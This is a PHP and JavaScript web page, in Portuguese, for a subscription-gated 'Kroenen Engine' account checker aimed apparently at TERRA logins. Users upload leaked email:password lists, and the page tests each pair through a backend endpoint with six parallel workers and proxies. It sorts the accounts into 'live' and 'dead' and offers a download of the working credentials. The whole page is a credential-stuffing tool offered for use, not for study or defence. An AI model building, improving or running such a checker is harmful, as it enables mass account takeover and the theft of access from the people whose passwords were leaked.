<?php
session_start();
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) { header("Location: login.html"); exit; }
$role = $_SESSION['role'] ?? 'user';
$username = $_SESSION['username'] ?? 'User';
$expiration = $_SESSION['expiration'] ?? 0;
if ($role !== 'admin' && $expiration !== -1 && time() > $expiration) { session_destroy(); header("Location: login.html?msg=expired"); exit; }
$is_admin = ($role === 'admin');
$expiration_date = ($is_admin || $expiration === -1) ? "∞ Sem expiração" : date('d/m/Y H:i', $expiration);
session_write_close();
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Kroenen Engine — Checker</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<style>
:root{--bg:#020205;--surface:#0d0d12;--surface2:#13131a;--border:rgba(255,255,255,0.07);--border-hi:rgba(255,255,255,0.13);--text:#f0f0f5;--muted:#6b7280;--accent:#7c3aed;--accent-hi:#9f5cf7;--success:#10b981;--success-bg:rgba(16,185,129,0.08);--danger:#ef4444;--danger-bg:rgba(239,68,68,0.08);--radius:14px}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;-webkit-font-smoothing:antialiased}
body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(124,58,237,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(124,58,237,.03) 1px,transparent 1px);background-size:48px 48px;z-index:0;pointer-events:none}
nav{position:sticky;top:0;z-index:50;display:flex;justify-content:space-between;align-items:center;padding:0 2rem;height:64px;background:rgba(2,2,5,0.85);backdrop-filter:blur(16px);border-bottom:1px solid var(--border)}
.nav-brand{display:flex;align-items:center;gap:.7rem;text-decoration:none}
.nav-icon{width:34px;height:34px;background:linear-gradient(135deg,var(--accent),#4f46e5);border-radius:8px;display:flex;align-items:center;justify-content:center;box-shadow:0 0 18px rgba(124,58,237,.45)}
.nav-icon svg{width:18px;height:18px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
.nav-title{font-size:1rem;font-weight:700;letter-spacing:-.02em;color:var(--text)}
.nav-right{display:flex;align-items:center;gap:.75rem}
.user-chip{display:flex;align-items:center;gap:.6rem;background:var(--surface2);border:1px solid var(--border);border-radius:9999px;padding:.35rem .9rem .35rem .4rem}
.user-avatar{width:28px;height:28px;border-radius:50%;background:linear-gradient(135deg,var(--accent),#4f46e5);display:flex;align-items:center;justify-content:center;font-size:.75rem;font-weight:700;color:#fff}
.user-name{font-size:.85rem;font-weight:500}
.user-exp{font-size:.72rem;color:var(--muted)}
.btn{display:inline-flex;align-items:center;gap:.4rem;padding:.45rem .9rem;font-size:.8rem;font-weight:500;border-radius:9999px;cursor:pointer;transition:all .2s;text-decoration:none;border:1px solid var(--border);background:var(--surface2);color:var(--text)}
.btn:hover{border-color:var(--border-hi);background:rgba(255,255,255,.05)}
.btn-danger{background:var(--danger-bg);border-color:rgba(239,68,68,.25);color:var(--danger)}
.btn-danger:hover{background:rgba(239,68,68,.15)}
.btn-admin{background:rgba(124,58,237,.12);border-color:rgba(124,58,237,.3);color:var(--accent-hi)}
.btn-admin:hover{background:rgba(124,58,237,.2)}
main{max-width:1100px;margin:0 auto;padding:2.5rem 1.5rem;position:relative;z-index:1}
.hero{text-align:center;margin-bottom:2.5rem;animation:rise .5s ease both}
.hero h1{font-size:2.6rem;font-weight:800;letter-spacing:-.05em;line-height:1.1}
.hero h1 span{background:linear-gradient(135deg,var(--accent-hi),#818cf8);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.hero p{color:var(--muted);margin-top:.5rem;font-size:.95rem}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;margin-bottom:1.5rem}
.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:1.2rem 1.4rem;display:flex;align-items:center;gap:1rem;transition:border-color .2s}
.stat-card:hover{border-color:var(--border-hi)}
.stat-icon{width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center}
.stat-icon svg{width:20px;height:20px;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;fill:none}
.stat-label{font-size:.72rem;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:.2rem}
.stat-val{font-size:1.6rem;font-weight:700;letter-spacing:-.04em;line-height:1}
.control-panel{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:1.8rem;margin-bottom:1.5rem}
.cp-title{font-size:.75rem;font-weight:600;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);margin-bottom:1.2rem}
.upload-zone{border:1.5px dashed var(--border-hi);border-radius:var(--radius);padding:1.5rem;text-align:center;cursor:pointer;transition:border-color .2s,background .2s;margin-bottom:1.2rem;background:rgba(124,58,237,.02)}
.upload-zone:hover,.upload-zone.dragover{border-color:var(--accent);background:rgba(124,58,237,.06)}
.upload-zone svg{width:32px;height:32px;stroke:var(--muted);stroke-width:1.5;fill:none;margin-bottom:.6rem}
.upload-zone p{font-size:.85rem;color:var(--muted)}
.upload-zone strong{color:var(--text)}
.upload-zone input[type=file]{display:none}
.file-name{font-size:.82rem;color:var(--accent-hi);margin-top:.4rem;font-weight:500}
.run-row{display:flex;gap:1rem;align-items:center}
.btn-start{flex:1;padding:.85rem;background:linear-gradient(135deg,var(--accent),#4f46e5);color:#fff;border:none;border-radius:var(--radius);font-size:.9rem;font-weight:600;cursor:pointer;transition:opacity .2s,transform .15s,box-shadow .2s;box-shadow:0 4px 20px rgba(124,58,237,.35);display:flex;align-items:center;justify-content:center;gap:.5rem}
.btn-start:hover:not(:disabled){opacity:.9;transform:translateY(-1px);box-shadow:0 8px 28px rgba(124,58,237,.45)}
.btn-start:disabled{opacity:.45;cursor:not-allowed}
.btn-start svg{width:18px;height:18px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
.progress-wrap{margin-top:1.2rem}
.progress-bar-bg{height:5px;background:var(--border);border-radius:9999px;overflow:hidden;margin-bottom:.6rem}
.progress-bar{height:100%;background:linear-gradient(90deg,var(--accent),#818cf8);width:0%;transition:width .3s ease;border-radius:9999px}
.progress-label{font-size:.8rem;color:var(--muted);display:flex;justify-content:space-between}
.results{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem}
@media(max-width:640px){.results,.stats{grid-template-columns:1fr}}
.result-panel{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);display:flex;flex-direction:column;overflow:hidden}
.rp-header{display:flex;justify-content:space-between;align-items:center;padding:.9rem 1.2rem;border-bottom:1px solid var(--border)}
.rp-title{display:flex;align-items:center;gap:.5rem;font-size:.875rem;font-weight:600}
.dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
.dot-live{background:var(--success);box-shadow:0 0 8px var(--success)}
.dot-die{background:var(--danger);box-shadow:0 0 8px var(--danger)}
.rp-badge{padding:.15rem .55rem;border-radius:9999px;font-size:.72rem;font-weight:700}
.badge-live{background:var(--success-bg);color:var(--success)}
.badge-die{background:var(--danger-bg);color:var(--danger)}
.log-box{flex:1;padding:1rem;height:320px;overflow-y:auto;font-family:'Consolas',monospace;font-size:.78rem;color:var(--muted);background:#000}
.log-box div{padding:.25rem 0;border-bottom:1px solid rgba(255,255,255,.03);word-break:break-all}
.live-text{color:var(--success)!important}
.die-text{color:var(--danger)!important}
.rp-footer{padding:.8rem 1rem;border-top:1px solid var(--border)}
.btn-dl{width:100%;padding:.6rem;border-radius:var(--radius);border:1px solid;font-size:.8rem;font-weight:600;cursor:pointer;text-align:center;text-decoration:none;display:block;transition:background .2s}
.btn-dl-live{background:var(--success-bg);border-color:rgba(16,185,129,.25);color:var(--success)}
.btn-dl-live:hover{background:rgba(16,185,129,.15)}
.btn-dl-die{background:var(--danger-bg);border-color:rgba(239,68,68,.25);color:var(--danger)}
.btn-dl-die:hover{background:rgba(239,68,68,.15)}
::-webkit-scrollbar{width:4px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:rgba(255,255,255,.1);border-radius:4px}
@keyframes rise{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
</style>
</head>
<body>
<nav>
<a href="#" class="nav-brand">
<div class="nav-icon"><svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg></div>
<span class="nav-title">Kroenen Engine</span>
</a>
<div class="nav-right">
<div class="user-chip">
<div class="user-avatar"><?= strtoupper(substr($username,0,1)) ?></div>
<div><div class="user-name"><?= htmlspecialchars($username) ?></div><div class="user-exp"><?= $expiration_date ?></div></div>
</div>
<?php if ($is_admin): ?>
<a href="admin.php" class="btn btn-admin"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="6"/><path d="M15.477 12.89L17 22l-5-3-5 3 1.523-9.11"/></svg> Admin</a>
<?php endif; ?>
<button class="btn btn-danger" onclick="logout()"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg> Sair</button>
</div>
</nav>
<main>
<div class="hero"><h1>Checker <span>TERRA</span></h1><p>Kroenen Automation Engine · OAuth2 TERRA Validator</p></div>
<div class="stats">
<div class="stat-card"><div class="stat-icon" style="background:rgba(124,58,237,.12)"><svg style="stroke:var(--accent-hi)" viewBox="0 0 24 24"><path d="M4 4h16v3H4zM4 11h16v2H4zM4 17h10v2H4z"/></svg></div><div><div class="stat-label">Total</div><div class="stat-val" id="statTotal">0</div></div></div>
<div class="stat-card"><div class="stat-icon" style="background:var(--success-bg)"><svg style="stroke:var(--success)" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div><div><div class="stat-label">Live</div><div class="stat-val" id="statLive" style="color:var(--success)">0</div></div></div>
<div class="stat-card"><div class="stat-icon" style="background:var(--danger-bg)"><svg style="stroke:var(--danger)" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></div><div><div class="stat-label">Dead</div><div class="stat-val" id="statDie" style="color:var(--danger)">0</div></div></div>
</div>
<div class="control-panel">
<div class="cp-title">⚡ Controle de Inspeção</div>
<div class="upload-zone" id="uploadZone" onclick="document.getElementById('listFile').click()">
<svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
<p><strong>Clique para enviar</strong> ou arraste o arquivo aqui</p>
<p style="font-size:.76rem;margin-top:.3rem">Formato: email:senha · .txt</p>
<div class="file-name" id="fileName"></div>
<input type="file" id="listFile" accept=".txt">
</div>
<div class="run-row"><button id="startBtn" class="btn-start" onclick="startChecker()"><svg viewBox="0 0 24 24"><polygon points="5 3 19 12 5 21 5 3"/></svg> Iniciar Inspeção</button></div>
<div class="progress-wrap"><div class="progress-bar-bg"><div id="progressBar" class="progress-bar"></div></div><div class="progress-label"><span id="statusText">Sistema pronto · aguardando arquivo</span><span id="progressPct">0%</span></div></div>
</div>
<div class="results">
<div class="result-panel"><div class="rp-header"><div class="rp-title"><span class="dot dot-live"></span> Live Accounts</div><span id="liveCount" class="rp-badge badge-live">0</span></div><div id="liveList" class="log-box"></div><div class="rp-footer"><a href="#" onclick="downloadResults('lives');return false;" class="btn-dl btn-dl-live">⬇ Download Lives</a></div></div>
<div class="result-panel"><div class="rp-header"><div class="rp-title"><span class="dot dot-die"></span> Dead Accounts</div><span id="dieCount" class="rp-badge badge-die">0</span></div><div id="dieList" class="log-box"></div><div class="rp-footer"><a href="#" onclick="downloadResults('dies');return false;" class="btn-dl btn-dl-die">⬇ Download Dies</a></div></div>
</div>
</main>
<script>
function logout(){fetch('auth.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=logout'}).then(()=>window.location.href='login.html');}

var zone=document.getElementById('uploadZone');
var fileInput=document.getElementById('listFile');
fileInput.addEventListener('change',function(){if(fileInput.files[0])document.getElementById('fileName').textContent='📄 '+fileInput.files[0].name;});
zone.addEventListener('dragover',function(e){e.preventDefault();zone.classList.add('dragover');});
zone.addEventListener('dragleave',function(){zone.classList.remove('dragover');});
zone.addEventListener('drop',function(e){e.preventDefault();zone.classList.remove('dragover');var dt=e.dataTransfer;if(dt.files[0]){fileInput.files=dt.files;document.getElementById('fileName').textContent='📄 '+dt.files[0].name;}});

var accounts=[],proxies=[],currentIndex=0,liveCount=0,dieCount=0,isRunning=false,allResults=[];
var THREADS=6;

function readFile(file){return new Promise(function(resolve,reject){var reader=new FileReader();reader.onload=function(e){resolve(e.target.result);};reader.onerror=function(){reject(new Error('Erro ao ler arquivo'));};reader.readAsText(file);});}

async function startChecker(){
if(isRunning)return;
if(!fileInput.files||fileInput.files.length===0){alert('Anexe o arquivo .txt com a lista email:senha.');return;}
var btn=document.getElementById('startBtn');
btn.disabled=true;
btn.innerHTML='<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> Carregando...';
try{
try{var res=await fetch('api.php?action=init');var d=await res.json();proxies=d.proxies||[];}catch(e){console.warn('Init skip:',e);proxies=[];}
var text=await readFile(fileInput.files[0]);
accounts=[];
var lines=text.split(/\r?\n/);
for(var i=0;i<lines.length;i++){var line=lines[i].trim();if(line&&line.indexOf(':')>-1){var p=line.split(':');var em=p[0].trim();var pw=p.slice(1).join(':').trim();if(em.indexOf('@')>-1)accounts.push({email:em,password:pw});}}
if(!accounts.length){alert('Nenhuma conta válida encontrada!');resetUI();return;}
isRunning=true;currentIndex=0;liveCount=0;dieCount=0;allResults=[];
document.getElementById('liveList').innerHTML='';
document.getElementById('dieList').innerHTML='';
document.getElementById('statTotal').textContent=accounts.length;
updateCounts();
btn.innerHTML='⏳ Inspecionando...';
var workers=[];
for(var j=0;j<THREADS;j++)workers.push(worker());
await Promise.all(workers);
document.getElementById('statusText').textContent='✅ Concluído! '+accounts.length+' targets processados.';
btn.innerHTML='✔ Processo Finalizado';
}catch(err){console.error('startChecker error:',err);resetUI();}
}

function resetUI(){
isRunning=false;
var btn=document.getElementById('startBtn');
btn.disabled=false;
btn.innerHTML='<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"/></svg> Iniciar Inspeção';
document.getElementById('statusText').textContent='Sistema pronto · aguardando arquivo';
document.getElementById('progressBar').style.width='0%';
document.getElementById('progressPct').textContent='0%';
}

async function worker(){
while(currentIndex<accounts.length){
var idx=currentIndex++;
var ac=accounts[idx];
await checkAccount(ac.email,ac.password);
var checked=liveCount+dieCount;
var pct=Math.round((checked/accounts.length)*100);
document.getElementById('progressBar').style.width=pct+'%';
document.getElementById('progressPct').textContent=pct+'%';
document.getElementById('statusText').textContent='Inspecionando '+checked+' / '+accounts.length+'...';
}
}

async function checkAccount(email,password){
var fd=new FormData();
fd.append('email',email);
fd.append('password',password);
try{
var res=await fetch('api.php?action=check',{method:'POST',body:fd});
var r=await res.json();
allResults.push({email:email,password:password,status:r.status});
if(r.status==='live'){liveCount++;addToList('liveList',email+':'+password,'live-text');}
else{dieCount++;addToList('dieList',email+':'+password+' · '+(r.reason||'die'),'die-text');}
updateCounts();
}catch(e){
allResults.push({email:email,password:password,status:'die'});
dieCount++;
addToList('dieList',email+':'+password+' · ERROR','die-text');
updateCounts();
}
}

function addToList(id,text,cls){var el=document.getElementById(id);var div=document.createElement('div');div.className=cls;div.textContent=text;el.appendChild(div);el.scrollTop=el.scrollHeight;}
function updateCounts(){document.getElementById('liveCount').textContent=liveCount;document.getElementById('dieCount').textContent=dieCount;document.getElementById('statLive').textContent=liveCount;document.getElementById('statDie').textContent=dieCount;}

function downloadResults(type){
var filtered=type==='lives'?allResults.filter(function(r){return r.status==='live';}):allResults.filter(function(r){return r.status!=='live';});
if(filtered.length===0){alert('Nenhum resultado para exportar');return;}
var text=filtered.map(function(r){return r.email+':'+r.password;}).join('\n');
var blob=new Blob([text],{type:'text/plain'});
var a=document.createElement('a');
a.href=URL.createObjectURL(blob);
a.download=type+'.txt';
document.body.appendChild(a);
a.click();
document.body.removeChild(a);
}
</script>
</body>
</html>
